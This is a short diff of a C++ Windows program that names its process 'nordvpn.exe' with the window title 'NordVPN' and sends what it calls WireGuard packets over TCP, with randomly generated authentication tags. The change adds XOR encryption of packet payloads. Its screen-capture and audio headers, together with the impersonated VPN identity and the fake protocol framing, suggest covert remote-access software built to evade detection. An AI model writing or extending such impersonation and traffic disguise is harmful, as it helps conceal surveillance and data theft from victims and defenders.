@@ -12,13 +12,14 @@
 #include <climits>
 #include <mutex>
 #include <iomanip>
-#include <d3d11.h>
-#include <dxgi1_2.h>
-
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <mmsystem.h>
+
+#include <d3d11.h>
+#include <dxgi1_2.h>
+#include "xor_cipher.h"
 
 #define PROCESS_NAME "nordvpn.exe"
 #define WINDOW_TITLE "NordVPN"
@@ -206,9 +207,9 @@ struct WireGuardPacket {
     WireGuardHeader header;
     std::vector<BYTE> encrypted_payload;
     BYTE auth_tag[16];
-    
+
     WireGuardPacket(const std::vector<BYTE>& payload) {
-        encrypted_payload = payload;
+        encrypted_payload = encryptData(payload);
         for (int i = 0; i < 16; i++) {
             auth_tag[i] = rand() % 256;
         }
@@ -695,7 +696,9 @@ private:
         if (!recvAll(tcp_socket, reinterpret_cast<char*>(data.data()), len)) {
             return WireGuardPacket({});
         }
-        return WireGuardPacket::deserialize(data);
+        WireGuardPacket pkt = WireGuardPacket::deserialize(data);
+        pkt.encrypted_payload = decryptData(pkt.encrypted_payload);
+        return pkt;
     }
     
 public:
